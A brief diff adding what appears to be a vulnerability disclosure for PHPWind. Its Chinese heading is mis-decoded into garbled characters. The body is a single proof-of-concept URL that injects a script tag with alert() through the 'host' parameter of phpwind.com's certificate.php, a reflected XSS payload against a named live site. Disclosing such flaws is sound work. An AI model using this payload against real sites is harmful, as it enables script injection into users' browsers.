@@ -1,0 +1,5 @@
+PHPWIND XSS¿çÕ¾Â©¶´ 
+
+Ö¤Ã÷£º
+
+http://www.phpwind.com/certificate.php?host='"><script>alert(88668066);</script><"
